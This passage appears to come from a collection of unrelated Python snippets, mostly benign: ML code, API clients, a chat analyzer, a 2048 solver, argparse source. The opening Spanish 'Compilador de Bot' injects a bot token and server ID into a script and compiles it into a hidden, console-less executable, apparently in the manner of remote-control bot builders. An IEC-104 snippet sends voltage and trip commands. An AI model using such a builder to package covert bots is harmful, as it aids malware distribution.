imagen usando la ruta\n        diablo_img = diablo_img.resize((50, 50))  # Redimensionar la imagen\n        diablo_photo = ImageTk.PhotoImage(diablo_img)\n        \n        # Crear y mostrar el label con la imagen\n        label_diablo = tk.Label(progress_window, image=diablo_photo, bg=\"#2E2E2E\")\n        label_diablo.image = diablo_photo\n        label_diablo.pack(pady=10)\n\n    except FileNotFoundError:\n        messagebox.showerror(\"Error\", \"No se pudo encontrar la imagen del diablo. Aseg\u00farate de que la ruta sea correcta.\")\n        return\n    \n    # Crear la barra de progreso\n    progress_bar = ttk.Progressbar(progress_window, orient=\"horizontal\", length=400, mode=\"indeterminate\")  # Usar ttk\n    progress_bar.pack(pady=10)\n    progress_bar.start()\n\n    # Funci\u00f3n para realizar la compilaci\u00f3n\n    def compile_process():\n        try:\n            # Leer el contenido del archivo seleccionado con codificaci\u00f3n UTF-8\n            with open(file_path, \"r\", encoding=\"utf-8\") as file:\n                file_content = file.read()\n\n            # Reemplazar los valores de bot_token y server_id en el archivo\n            file_content = file_content.replace('bot_token = \"{bot_token}\"', f'bot_token = \"{bot_token}\"')\n            file_content = file_content.replace('server_id = \"{server_id}\"', f'server_id = \"{server_id}\"')\n\n            # Guardar el archivo con las modificaciones usando UTF-8\n            with open(file_path, \"w\", encoding=\"utf-8\") as file:\n                file.write(file_content)\n\n            # Permitir al usuario seleccionar una carpeta donde depositar el ejecutable\n            output_directory = filedialog.askdirectory(title=\"Selecciona la carpeta de destino para el ejecutable\")\n            if not output_directory:\n                raise ValueError(\"No se seleccion\u00f3 ninguna carpeta de destino.\")\n\n            #################################################################\n            #           IMPORTANTE!! RUTA ABSOLUTA DE PYINSTALLER           #\n            #################################################################\n\n            # Ruta abosulta de pyinstaller\n            pyinstaller_path = \"C:/Users/d1se0/AppData/Local/Packages/PythonSoftwareFoundation.Python.3.11_qbz5n2kfra8p0/LocalCache/local-packages/Python311/Scripts/pyinstaller.exe\"\n\n            # Construir el comando completo como una sola cadena\n            command = f'\"{pyinstaller_path}\" --onefile --noconsole --distpath \"{output_directory}\" \"{file_path}\"'\n\n            # Ejecutar pyinstaller como una \u00fanica cadena\n            subprocess.run(command, shell=True, check=True)\n\n            # Cerrar la ventana de progreso cuando termine\n            progress_window.destroy()\n            messagebox.showinfo(\"\u00c9xito\", f\"El archivo .exe se gener\u00f3 correctamente en la carpeta: {output_directory}\")\n\n        except Exception as e:\n            progress_window.destroy()\n            messagebox.showerror(\"Error\", f\"Hubo un problema: {e}\")\n\n    # Ejecutar la compilaci\u00f3n en un hilo para no bloquear la interfaz gr\u00e1fica\n    compile_thread = threading.Thread(target=compile_process)\n    compile_thread.start()\n\n\n# Crear la interfaz gr\u00e1fica\nroot = tk.Tk()\nroot.title(\"Compilador de Bot\")\nroot.geometry(\"500x400\")\nroot.configure(bg=\"#2E2E2E\")\nroot.resizable(False, False)\n\n# Estilo moderno\nstyle_font = (\"Arial\", 14)\nstyle_fg = \"#00FF00\"\nstyle_bg = \"#2E2E2E\"\nbutton_fg = \"#FFFFFF\"\nbutton_bg = \"#4CAF50\"\nbutton_hover = \"#45a049\"\n\n# Agregar un t\u00edtulo\nlabel_title = tk.Label(ro",
    "import streamlit as st\r\nimport random\r\nimport json\r\nfrom sklearn.feature_extraction.text import TfidfVectorizer\r\nfrom sklearn.linear_model import LogisticRegression\r\nimport nltk\r\n\r\n# Load the intents file\r\nwith open('intents.json') as f:\r\n    intents = json.load(f)\r\n\r\n# Prepare data for model training\r\npatterns = []\r\ntags = []\r\nfor intent in intents['intents']:\r\n    for pattern in intent['patterns']:\r\n        patterns.append(pattern)\r\n        tags.append(intent['tag'])\r\n\r\n# Train a simple logistic regression model\r\nvectorizer = TfidfVectorizer()\r\nX = vectorizer.fit_transform(patterns)\r\nmodel = LogisticRegression()\r\nmodel.fit(X, tags)\r\n\r\n# Define the chatbot's response function\r\ndef chatbot_response(user_input):\r\n    input_vector = vectorizer.transform([user_input])\r\n    predicted_tag = model.predict(input_vector)[0]\r\n\r\n    for intent in intents['intents']:\r\n        if intent['tag'] == predicted_tag:\r\n            return random.choice(intent['responses'])\r\n    return \"I'm sorry, I don't understand.\"\r\n\r\n# Streamlit UI\r\nst.title(\"Healthcare Chatbot\")\r\nst.write(\"Type your health-related queries below and hit Enter.\")\r\n\r\nuser_input = st.text_input(\"You:\", \"\")\r\n\r\nif user_input:\r\n    response = chatbot_response(user_input)\r\n    st.write(f\"Chatbot: {response}\")",
    "\nfrom typing import List, Union\n\nfrom mmdet.models import BaseDetector\nfrom mmengine.structures import InstanceData\n\nfrom mmdet3d.registry import MODELS\nfrom mmdet3d.structures.det3d_data_sample import (ForwardResults,\n                                                  OptSampleList, SampleList)\nfrom mmdet3d.utils.typing_utils import (OptConfigType, OptInstanceList,\n                                        OptMultiConfig)\n\n\n@MODELS.register_module()\nclass Base3DDetector(BaseDetector):\n    \"\"\"Base class for 3D detectors.\n\n    Args:\n       data_preprocessor (dict or ConfigDict, optional): The pre-process\n           config of :class:`BaseDataPreprocessor`.  it usually includes,\n            ``pad_size_divisor``, ``pad_value``, ``mean`` and ``std``.\n       init_cfg (dict or ConfigDict, optional): the config to control the\n           initialization. Defaults to None.\n    \"\"\"\n\n    def __init__(self,\n                 data_preprocessor: OptConfigType = None,\n                 init_cfg: OptMultiConfig = None) -> None:\n        super().__init__(\n            data_preprocessor=data_preprocessor, init_cfg=init_cfg)\n\n    def forward(self,\n                inputs: Union[dict, List[dict]],\n                data_samples: OptSampleList = None,\n                mode: str = 'tensor',\n                **kwargs) -> ForwardResults:\n        \"\"\"The unified entry for a forward process in both training and test.\n\n        The method should accept three modes: \"tensor\", \"predict\" and \"loss\":\n\n        - \"tensor\": Forward the whole network and return tensor or tuple of\n        tensor without any post-processing, same as a common nn.Module.\n        - \"predict\": Forward and return the predictions, which are fully\n        processed to a list of :obj:`Det3DDataSample`.\n        - \"loss\": Forward and return a dict of losses according to the given\n        inputs and data samples.\n\n        Note that this method doesn't handle neither back propagation nor\n        optimizer updating, which are done in the :meth:`train_step`.\n\n        Args:\n            inputs  (dict | list[dict]): When it is a list[dict], the\n                outer list indicate the test time augmentation. Each\n                dict contains batch inputs\n                which include 'points' and 'imgs' keys.\n\n                - points (list[torch.Tensor]): Point cloud of each sample.\n                - imgs (torch.Tensor): Image tensor has shape (B, C, H, W).\n            data_samples (list[:obj:`Det3DDataSample`],\n                list[list[:obj:`Det3DDataSample`]], optional): The\n                annotation data of every samples. When it is a list[list], the\n                outer list indicate the test time augmentation, and the\n                inter list indicate the batch. Otherwise, the list simply\n                indicate the batch. Defaults to None.\n            mode (str): Return what kind of value. Defaults to 'tensor'.\n\n        Returns:\n            The return type depends on ``mode``.\n\n            - If ``mode=\"tensor\"``, return a tensor or a tuple of tensor.\n            - If ``mode=\"predict\"``, return a list of :obj:`Det3DDataSample`.\n            - If ``mode=\"loss\"``, return a dict of tensor.\n        \"\"\"\n        if mode == 'loss':\n            return self.loss(inputs, data_samples, **kwargs)\n        elif mode == 'predict':\n            if isinstance(data_samples[0], list):\n                # aug test\n                assert len(data_samples[0]) == 1, 'Only support ' \\\n                                                  'batch_size 1 ' \\\n                                                  'in mmdet3d when ' \\\n                                                  'do the test' \\\n                                                  'time augmentation.'\n                return self.aug_test(inputs, data_samples, **kwargs)\n            else:\n                return self.predict(inputs, data_samples, **kwargs)\n        elif mode == 'tensor':\n            return self._forward(inputs, data_samples, **kwargs)\n        else:\n            raise RuntimeError(f'Invalid mode \"{mode}\". '\n                               'Only supports loss, predict and tensor mode')\n\n    def add_pred_to_datasample(\n        self,\n        data_samples: SampleList,\n        data_instances_3d: OptInstanceList = None,\n        data_instances_2d: OptInstanceList = None,\n    ) -> SampleList:\n        \"\"\"Convert results list to `Det3DDataSample`.\n\n        Subclasses could override it to be compatible for some multi-modality\n        3D detectors.\n\n        Args:\n            data_samples (list[:obj:`Det3DDataSample`]): The input data.\n            data_instances_3d (list[:obj:`InstanceData`], optional): 3D\n                Detection results of each sample.\n            data_instances_2d (list[:obj:`InstanceData`], optional): 2D\n                Detection results of each sample.\n\n        Returns:\n            list[:obj:`Det3DDataSample`]: Detection results of the\n            input. Each Det3DDataSample usually contains\n            'pred_instances_3d'. And the ``",
    "import requests\nimport json\n\nurl = \"http://classyfire.wishartlab.com\"\n\ndef structure_query(compound, label='pyclassyfire'):\n    \"\"\"\n    Submit a compound information to the ClassyFire service for evaluation\n    and receive an ID which can be used to collect results.\n\n    :param compound: The compound structures as line-delimited InChIKey or SMILES.\n    :type compound: str\n    :param label: A label for the query\n    :type label: str\n    :return: A query ID number\n    :rtype: int\n    \"\"\"\n    payload = {\n        \"label\": label,\n        \"query_input\": compound,\n        \"query_type\": \"STRUCTURE\"\n    }\n    headers = {\"Content-Type\": \"application/json\"}\n    r = requests.post(f\"{url}/queries.json\", data=json.dumps(payload), headers=headers)\n    r.raise_for_status()\n    return r.json()['id']\n\ndef get_results(query_id, return_format=\"json\"):\n    \"\"\"\n    Given a query_id, fetch the classification results.\n\n    :param query_id: A numeric query ID returned at the time of query submission\n    :type query_id: str\n    :param return_format: Desired return format. Valid types are json, csv, or sdf\n    :type return_format: str\n    :return: Query information\n    :rtype: str\n    \"\"\"\n    r = requests.get(f\"{url}/queries/{query_id}.{return_format}\", headers={\"Content-Type\": f\"application/{return_format}\"})\n    r.raise_for_status()\n    return r.text",
    "\n# CODE TO READ FROM SERVER AND WRITE TO SERVER VALUES\n\n\nimport c104\nimport time\n\ndef main():\n    client = c104.Client()\n    connection = client.add_connection(ip=\"127.0.0.1\", port=2404, init=c104.Init.ALL)\n    station = connection.add_station(common_address=1)\n\n    voltage_point = station.add_point(io_address=11, type=c104.Type.M_ME_NC_1)\n\n    voltage_setpoint = station.add_point(io_address=1, type=c104.Type.C_SE_NC_1)\n\n    trip_status = station.add_point(io_address=13, type=c104.Type.C_SC_NA_1)\n    client.start()\n\n    while connection.state != c104.ConnectionState.OPEN:\n        print(f\"Waiting for connection to {connection.ip}:{connection.port}\")\n        time.sleep(1)\n\n    if voltage_point:\n        print(f\"Voltage: {voltage_point.value} V\")\n\n    if voltage_setpoint:\n        new_voltage = 250.0  \n        print(f\"Setting new voltage setpoint: {new_voltage} V\")\n\n        voltage_setpoint.value = new_voltage\n\n        # Use appropriate command mode and cause of transmission\n        voltage_setpoint.command_mode = c104.CommandMode.DIRECT  # Using DIRECT mode\n\n        # Transmit the updated value to the server\n        voltage_setpoint.transmit(cause=c104.Cot.ACTIVATION)\n        print(f\"New voltage setpoint is set to: {voltage_setpoint.value} V\")\n        print(\"Value transmitted to the server with ACTIVATION cause.\")\n    else:\n        print(\"Setpoint with io_address 12 not found.\")\n\n    if voltage_point.value>250:\n        new_trip_status=True\n        print(\"Tripping the connection\")\n        trip_status.value  = new_trip_status\n        trip_status.command_mode = c104.CommandMode.DIRECT\n        trip_status.transmit(cause=c104.Cot.ACTIVATION)\n        print(\"Successfully tripped\")\n    else:\n        new_trip_status=False\n        trip_status.value  = new_trip_status\n        trip_status.command_mode = c104.CommandMode.DIRECT\n        trip_status.transmit(cause=c104.Cot.ACTIVATION)\n        print(\"Trip status not changed\")\n\n    # Step 7: Disconnect after some time\n    time.sleep(10)\n    connection.disconnect()\n    print(\"Disconnected from server.\")\n\nif __name__ == \"__main__\":\n    main()\n",
    "\"\"\"\nCore domain models for the data pipeline.\n\nThis module defines the fundamental data models used throughout the data pipeline,\nfocusing on domain concepts and value objects.\n\"\"\"\nfrom dataclasses import dataclass\nfrom datetime import datetime\nfrom decimal import Decimal\nfrom typing import Optional\n\nfrom alpha_pulse.exchanges import ExchangeType\n\n\n@dataclass(frozen=True)\nclass TimeRange:\n    \"\"\"\n    Value object representing a time range.\n    \n    Immutable to prevent accidental modifications and ensure thread safety.\n    \"\"\"\n    start: datetime\n    end: datetime\n\n    def __post_init__(self):\n        \"\"\"Validate time range on creation.\"\"\"\n        if self.start > self.end:\n            raise ValueError(\"Start time must be before end time\")\n\n    def contains(self, timestamp: datetime) -> bool:\n        \"\"\"Check if timestamp is within range.\"\"\"\n        return self.start <= timestamp <= self.end\n\n    def overlaps(self, other: 'TimeRange') -> bool:\n        \"\"\"Check if this range overlaps with another.\"\"\"\n        return (\n            self.contains(other.start) or\n            self.contains(other.end) or\n            other.contains(self.start) or\n            other.contains(self.end)\n        )\n\n\n@dataclass(frozen=True)\nclass MarketSymbol:\n    \"\"\"\n    Value object representing a market symbol.\n    \n    Immutable to prevent accidental modifications and ensure thread safety.\n    \"\"\"\n    base: str\n    quote: str\n\n    def __post_init__(self):\n        \"\"\"Validate symbol components.\"\"\"\n        if not self.base or not self.quote:\n            raise ValueError(\"Base and quote currencies are required\")\n\n    @classmethod\n    def from_string(cls, symbol: str) -> 'MarketSymbol':\n        \"\"\"Create from string representation.\"\"\"\n        try:\n            base, quote = symbol.split('/')\n            return cls(base=base, quote=quote)\n        except ValueError:\n            raise ValueError(\n                f\"Invalid symbol format: {symbol}. \"\n                f\"Must be in format 'BASE/QUOTE' (e.g., 'BTC/USDT')\"\n            )\n\n    def __str__(self) -> str:\n        \"\"\"Get string representation.\"\"\"\n        return f\"{self.base}/{self.quote}\"\n\n\n@dataclass(frozen=True)\nclass PriceUpdate:\n    \"\"\"\n    Value object representing a price update.\n    \n    Immutable to prevent accidental modifications and ensure thread safety.\n    \"\"\"\n    exchange: ExchangeType\n    symbol: MarketSymbol\n    price: Decimal\n    timestamp: datetime\n    volume: Optional[Decimal] = None\n\n    def __post_init__(self):\n        \"\"\"Validate price update.\"\"\"\n        if self.price <= 0:\n            raise ValueError(\"Price must be positive\")\n        if self.volume is not None and self.volume < 0:\n            raise ValueError(\"Volume cannot be negative\")\n\n\n@dataclass(frozen=True)\nclass MarketDepth:\n    \"\"\"\n    Value object representing market depth.\n    \n    Immutable to prevent accidental modifications and ensure thread safety.\n    \"\"\"\n    exchange: ExchangeType\n    symbol: MarketSymbol\n    timestamp: datetime\n    bids: list[tuple[Decimal, Decimal]]  # List of (price, amount) tuples\n    asks: list[tuple[Decimal, Decimal]]  # List of (price, amount) tuples\n\n    def __post_init__(self):\n        \"\"\"Validate market depth.\"\"\"\n        if not self.bids and not self.asks:\n            raise ValueError(\"At least one bid or ask is required\")\n        \n        # Validate bid/ask prices and amounts\n        for price, amount in self.bids + self.asks:\n            if price <= 0:\n                raise ValueError(\"Prices must be positive\")\n            if amount <= 0:\n                raise ValueError(\"Amounts must be positive\")\n        \n        # Validate bid/ask ordering\n        if len(self.bids) > 1:\n            for i in range(1, len(self.bids)):\n                if self.bids[i][0] >= self.bids[i-1][0]:\n                    raise ValueError(\"Bids must be in descending price order\")\n        \n        if len(self.asks) > 1:\n            for i in range(1, len(self.asks)):\n                if self.asks[i][0] <= self.asks[i-1][0]:\n                    raise ValueError(\"Asks must be in ascending price order\")",
    "import os\nimport requests\nimport tiktoken\nimport numpy as np\n\n# download the tiny shakespeare dataset\ninput_file_path = os.path.join(os.path.dirname(__file__), 'input.txt')\nif not os.path.exists(input_file_path):\n    data_url = 'https://raw.githubusercontent.com/karpathy/char-rnn/master/data/tinyshakespeare/input.txt'\n    with open(input_file_path, 'w', encoding='utf-8') as f:\n        f.write(requests.get(data_url).text)\n\nwith open(input_file_path, 'r', encoding='utf-8') as f:\n    data = f.read()\nn = len(data)\ntrain_data = data[:int(n*0.9)]\nval_data = data[int(n*0.9):]\n\n# encode with tiktoken gpt2 bpe\nenc = tiktoken.get_encoding(\"gpt2\")\ntrain_ids = enc.encode_ordinary(train_data)\nval_ids = enc.encode_ordinary(val_data)\nprint(f\"train has {len(train_ids):,} tokens\")\nprint(f\"val has {len(val_ids):,} tokens\")\n\n# export to bin files\ntrain_ids = np.array(train_ids, dtype=np.uint16)\nval_ids = np.array(val_ids, dtype=np.uint16)\ntrain_ids.tofile(os.path.join(os.path.dirname(__file__), 'train.bin'))\nval_ids.tofile(os.path.join(os.path.dirname(__file__), 'val.bin'))\n\n# train.bin has 301,966 tokens\n# val.bin has 36,059 tokens\n",
    "import re\n\ndef check_password_strength(password):\n    # Criteria for password strength\n    length_criteria = len(password) >= 8\n    uppercase_criteria = bool(re.search(r'[A-Z]', password))\n    lowercase_criteria = bool(re.search(r'[a-z]', password))\n    number_criteria = bool(re.search(r'\\d', password))\n    special_char_criteria = bool(re.search(r'[!@#$%^&*(),.?\":{}|<>]', password))\n    \n    # Feedback and suggestions\n    feedback = []\n    if not length_criteria:\n        feedback.append(\"- Password should be at least 8 characters long.\")\n    if not uppercase_criteria:\n        feedback.append(\"- Password should contain at least one uppercase letter.\")\n    if not lowercase_criteria:\n        feedback.append(\"- Password should contain at least one lowercase letter.\")\n    if not number_criteria:\n        feedback.append(\"- Password should contain at least one number.\")\n    if not special_char_criteria:\n        feedback.append(\"- Password should contain at least one special character.\")\n    \n    # Assessing strength\n    strength_score = sum([length_criteria, uppercase_criteria, lowercase_criteria, number_criteria, special_char_criteria])\n    if strength_score == 5:\n        strength = \"Strong\"\n    elif strength_score >= 3:\n        strength = \"Moderate\"\n    else:\n        strength = \"Weak\"\n    \n    return strength, feedback\n\n# Ask for user input\nuser_password = input(\"Enter your password: \")\nstrength, feedback = check_password_strength(user_password)\n\n# Display the result\nprint(f\"\\nPassword Strength: {strength}\")\nif feedback:\n    print(\"Suggestions to improve your password:\")\n    for suggestion in feedback:\n        print(suggestion)",
    "import socket\nimport re\nimport copy\nimport math\nimport time\n\n# Configuration for retry mechanism\nRECEIVE_RETRIES = 5          # Number of retries for receiving data\nRECEIVE_DELAY = 2            # Delay (in seconds) between retries\nSEND_RETRIES = 3             # Number of retries for sending data\nSEND_DELAY = 1               # Delay (in seconds) between send retries\n\ndef receive_data(sock):\n    \"\"\"\n    Receive data from the socket until the prompt is reached.\n    Implements a retry mechanism to handle temporary network issues.\n    \"\"\"\n    retries = 0\n    while retries < RECEIVE_RETRIES:\n        data = ''\n        try:\n            while True:\n                chunk = sock.recv(4096).decode()\n                if not chunk:\n                    break\n                data += chunk\n                if 'Enter command(s)' in data or 'Game Over' in data or 'Congratulations' in data:\n                    break\n            if data:\n                return data\n            else:\n                raise socket.timeout\n        except socket.timeout:\n            retries += 1\n            print(f\"Receive timeout. Retrying {retries}/{RECEIVE_RETRIES}...\")\n            time.sleep(RECEIVE_DELAY)\n    print(\"Failed to receive data after multiple attempts.\")\n    return None\n\ndef parse_board(output_lines):\n    \"\"\"Parse the game board from the output lines.\"\"\"\n    board = []\n    for line in output_lines:\n        # Match lines that contain the board numbers\n        match = re.match(r'\\s*(\\d+|0)\\s+(\\d+|0)\\s+(\\d+|0)\\s+(\\d+|0)', line)\n        if match:\n            row = []\n            for num in match.groups():\n                row.append(int(num))\n            board.append(row)\n    return board\n\ndef simulate_move(board, move):\n    \"\"\"Simulate the move and return the new board state.\"\"\"\n    new_board = [row.copy() for row in board]\n    if move == 'w':\n        new_board = move_up(new_board)\n    elif move == 'a':\n        new_board = move_left(new_board)\n    elif move == 's':\n        new_board = move_down(new_board)\n    elif move == 'd':\n        new_board = move_right(new_board)\n    else:\n        return None\n    return new_board\n\ndef is_valid_move(board, move):\n    \"\"\"Check if making the move changes the board state.\"\"\"\n    new_board = simulate_move(board, move)\n    return new_board != board\n\ndef decide_move(board):\n    \"\"\"Decide the next move based on the board state using Expectimax.\"\"\"\n    moves = ['w', 'a', 's', 'd']\n    best_move = None\n    best_score = -math.inf\n    depth = 3  # Adjust the depth based on performance\n\n    for move in moves:\n        if is_valid_move(board, move):\n            new_board = simulate_move(board, move)\n            score = expectimax(new_board, depth - 1, True)\n            if score > best_score:\n                best_score = score\n                best_move = move\n\n    return best_move if best_move else 'q'\n\ndef expectimax(board, depth, is_chance):\n    if depth == 0 or is_game_over(board):\n        return evaluate_board(board)\n    \n    if is_chance:\n        empty = get_empty_cells(board)\n        if not empty:\n            return evaluate_board(board)\n        expected_value = 0\n        probability_per_cell = 1 / len(empty)\n        for cell in empty:\n            for tile, prob in [(2, 0.9), (4, 0.1)]:\n                new_board = add_tile(copy.deepcopy(board), cell, tile)\n                score = expectimax(new_board, depth - 1, False)\n                expected_value += prob * (score * probability_per_cell)\n        return expected_value\n    else:\n        max_score = -math.inf\n        for move in ['w', 'a', 's', 'd']:\n            new_board = simulate_move(copy.deepcopy(board), move)\n            if new_board != board:\n                score = expectimax(new_board, depth - 1, True)\n                if score > max_score:\n                    max_score = score\n        return max_score if max_score != -math.inf else evaluate_board(board)\n\ndef is_game_over(board):\n    \"\"\"Check if no moves are possible.\"\"\"\n    for move in ['w', 'a', 's', 'd']:\n        if simulate_move(copy.deepcopy(board), move) != board:\n            return False\n    return True\n\ndef get_empty_cells(board):\n    \"\"\"Return a list of empty cells as (row, col) tuples.\"\"\"\n    empty = []\n    for i in range(len(board)):\n        for j in range(len(board[0])):\n            if board[i][j] == 0:\n                empty.append((i, j))\n    return empty\n\ndef add_tile(board, cell, tile):\n    \"\"\"Add a tile (2 or 4) to the specified cell.\"\"\"\n    row, col = cell\n    board[row][col] = tile\n    return board\n\ndef move_left(board):\n    size = len(board)\n    for row in board:\n        original = row.copy()\n        # Slide tiles to the left\n        tiles = [num for num in row if num != 0]\n        new_row = []\n        skip = False\n        for i in range(len(tiles)):\n            if skip:\n                skip = False\n                continue\n            if i + 1 < len(tiles) and tiles[i] == tiles[i + 1]:\n                new_row.append(tiles[i] * 2)\n                skip = True\n            else:\n         ",
    "# Now,I will learn Comperasion Operator.\n# Comperasion Operators : (>),(>=),(<),(<=) .\n# greater than >,greater than or equal >=,less than <,less than or equal <=.\n\n# Simple variable . Here \"m\" means Money .\nm = float(input(\"How many money you have : \"))\n\n# Using Codition with Comperasion Operator.\nif m < 1:\n\tprint(\"OH NO.You have no money.\")\n\nelif m <= 5:\n\tprint(\"You can eat chocollat.\")\n\nelif m <= 10:\n\tprint('You can eat chocollat or lollypop or cheaps.')\n\nelif m <= 20:\n\tprint('You can eat chocollat or lollypop or cheaps or joose.')\n\nelif m <=50:\n\tprint('You can eat chocollat or lollypop or cheaps or joose or cold drinks.')\n\nelif m <= 100:\n\tprint('You can eat chocollat or lollypop or cheaps or joose or cold drinks.')\n\tprint('Or you can buy a small book.')\n\nelif m <= 200:\n\tprint('You can eat many things or buy a small book.')\n\nelif m <= 400:\n\tprint('You can buy many books.')\n\nelif m <= 1000:\n\tprint('You can eat many things and buy many book.')\n\nelif m <= 5000:\n\tprint('You can buy many books or any featcher phone.')\n\nelif m <= 15000:\n\tprint('You can buy many books or RaspberryPi or a smart phone.')\n\nelif m > 15000:\n\tprint('You can buy many books or a cycle or a computer.')\n\nelse:print('Made by Hizbullah.')\n",
    "from urlextract import URLExtract\nfrom wordcloud import WordCloud\nimport pandas as pd\nfrom collections import Counter\nimport emoji\n\nextract = URLExtract()\n\ndef fetch_stats(selected_user, df):\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    # fetch the number of messages\n    num_messages = df.shape[0]\n\n    # fetch the total number of words\n    words = []\n    for message in df['message']:\n        words.extend(message.split())\n\n    # fetch number of media messages\n    num_media_messages = df[df['message'] == '<Media omitted>\\n'].shape[0]\n\n    # fetch number of links shared\n    links = []\n    for message in df['message']:\n        links.extend(extract.find_urls(message))\n\n    return num_messages, len(words), num_media_messages, len(links)\n\ndef most_busy_users(df):\n    x = df['user'].value_counts().head()\n    df = round((df['user'].value_counts() / df.shape[0]) * 100, 2).reset_index().rename(\n        columns={'index': 'name', 'user': 'percent'})\n    return x, df\n\ndef create_wordcloud(selected_user, df):\n\n    f = open('stop_hinglish.txt', 'r')\n    stop_words = f.read()\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    temp = df[df['user'] != 'group_notification']\n    temp = temp[temp['message'] != '<Media omitted>\\n']\n\n    def remove_stop_words(message):\n        y = []\n        for word in message.lower().split():\n            if word not in stop_words:\n                y.append(word)\n        return \" \".join(y)\n\n    wc = WordCloud(width=500, height=500, min_font_size=10, background_color='white')\n    temp['message'] = temp['message'].apply(remove_stop_words)\n    df_wc = wc.generate(temp['message'].str.cat(sep=\" \"))\n    return df_wc\n\ndef most_common_words(selected_user, df):\n\n    f = open('stop_hinglish.txt', 'r')\n    stop_words = f.read()\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    temp = df[df['user'] != 'group_notification']\n    temp = temp[temp['message'] != '<Media omitted>\\n']\n\n    words = []\n\n    for message in temp['message']:\n        for word in message.lower().split():\n            if word not in stop_words:\n                words.append(word)\n\n    most_common_df = pd.DataFrame(Counter(words).most_common(20))\n    return most_common_df\n\ndef emoji_helper(selected_user, df):\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    emojis = []\n    for message in df['message']:\n        emojis.extend([c for c in message if emoji.is_emoji(c)])\n\n\n    emoji_df = pd.DataFrame(Counter(emojis).most_common(len(Counter(emojis))))\n\n    return emoji_df\n\ndef monthly_timeline(selected_user, df):\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    timeline = df.groupby(['year', 'month_num', 'month']).count()['message'].reset_index()\n\n    time = []\n    for i in range(timeline.shape[0]):\n        time.append(timeline['month'][i] + \"-\" + str(timeline['year'][i]))\n\n    timeline['time'] = time\n\n    return timeline\n\ndef daily_timeline(selected_user, df):\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    daily_timeline = df.groupby('only_date').count()['message'].reset_index()\n\n    return daily_timeline\n\ndef week_activity_map(selected_user, df):\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    return df['day_name'].value_counts()\n\ndef month_activity_map(selected_user, df):\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    return df['month'].value_counts()\n\ndef activity_heatmap(selected_user, df):\n\n    if selected_user != 'Overall':\n        df = df[df['user'] == selected_user]\n\n    user_heatmap = df.pivot_table(index='day_name', columns='period', values='message', aggfunc='count').fillna(0)\n\n    return user_heatmap\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "# Author: Steven J. Bethard <steven.bethard@gmail.com>.\n# New maintainer as of 29 August 2019:  Raymond Hettinger <raymond.hettinger@gmail.com>\n\n\"\"\"Command-line parsing library\n\nThis module is an optparse-inspired command-line parsing library that:\n\n    - handles both optional and positional arguments\n    - produces highly informative usage messages\n    - supports parsers that dispatch to sub-parsers\n\nThe following is a simple usage example that sums integers from the\ncommand-line and writes the result to a file::\n\n    parser = argparse.ArgumentParser(\n        description='sum the integers at the command line')\n    parser.add_argument(\n        'integers', metavar='int', nargs='+', type=int,\n        help='an integer to be summed')\n    parser.add_argument(\n        '--log', default=sys.stdout, type=argparse.FileType('w'),\n        help='the file where the sum should be written')\n    args = parser.parse_args()\n    args.log.write('%s' % sum(args.integers))\n    args.log.close()\n\nThe module contains the following public classes:\n\n    - ArgumentParser -- The main entry point for command-line parsing. As the\n        example above shows, the add_argument() method is used to populate\n        the parser with actions for optional and positional arguments. Then\n        the parse_args() method is invoked to convert the args at the\n        command-line into an object with attributes.\n\n    - ArgumentError -- The exception raised by ArgumentParser objects when\n        there are errors with the parser's actions. Errors raised while\n        parsing the command-line are caught by ArgumentParser and emitted\n        as command-line messages.\n\n    - FileType -- A factory for defining types of files to be created. As the\n        example above shows, instances of FileType are typically passed as\n        the type= argument of add_argument() calls.\n\n    - Action -- The base class for parser actions. Typically actions are\n        selected by passing strings like 'store_true' or 'append_const' to\n        the action= argument of add_argument(). However, for greater\n        customization of ArgumentParser actions, subclasses of Action may\n        be defined and passed as the action= argument.\n\n    - HelpFormatter, RawDescriptionHelpFormatter, RawTextHelpFormatter,\n        ArgumentDefaultsHelpFormatter -- Formatter classes which\n        may be passed as the formatter_class= argument to the\n        ArgumentParser constructor. HelpFormatter is the default,\n        RawDescriptionHelpFormatter and RawTextHelpFormatter tell the parser\n        not to change the formatting for help text, and\n        ArgumentDefaultsHelpFormatter adds information about argument defaults\n        to the help.\n\nAll other classes in this module are considered implementation details.\n(Also note that HelpFormatter and RawDescriptionHelpFormatter are only\nconsidered public as object names -- the API of the formatter objects is\nstill considered an implementation detail.)\n\"\"\"\n\n__version__ = '1.1'\n__all__ = [\n    'ArgumentParser',\n    'ArgumentError',\n    'ArgumentTypeError',\n    'BooleanOptionalAction',\n    'FileType',\n    'HelpFormatter',\n    'ArgumentDefaultsHelpFormatter',\n    'RawDescriptionHelpFormatter',\n    'RawTextHelpFormatter',\n    'MetavarTypeHelpFormatter',\n    'Namespace',\n    'Action',\n    'ONE_OR_MORE',\n    'OPTIONAL',\n    'PARSER',\n    'REMAINDER',\n    'SUPPRESS',\n    'ZERO_OR_MORE',\n]\n\n\nimport os as _os\nimport re as _re\nimport sys as _sys\n\nimport warnings\n\nfrom gettext import gettext as _, ngettext\n\nSUPPRESS = '==SUPPRESS=='\n\nOPTIONAL = '?'\nZERO_OR_MORE = '*'\nONE_OR_MORE = '+'\nPARSER = 'A...'\nREMAINDER = '...'\n_UNRECOGNIZED_ARGS_ATTR = '_unrecognized_args'\n\n# =============================\n# Utility functions and classes\n# =============================\n\nclass _AttributeHolder(object):\n    \"\"\"Abstract base class that provides __repr__.\n\n    The __repr__ method returns a string in the format::\n        ClassName(attr=name, attr=name, ...)\n    The attributes are determined either by a class-level attribute,\n    '_kwarg_names', or by inspecting the instance __dict__.\n    \"\"\"\n\n    def __repr__(self):\n        type_name = type(self).__name__\n        arg_strings = []\n        star_args = {}\n        for arg in self._get_args():\n            arg_strings.append(repr(arg))\n        for name, value in self._get_kwargs():\n            if name.isidentifier():\n                arg_strings.append('%s=%r' % (name, value))\n            else:\n                star_args[name] = value\n        if star_args:\n            arg_strings.append('**%s' % repr(star_args))\n        return '%s(%s)' % (type_name, ', '.join(arg_strings))\n\n    def 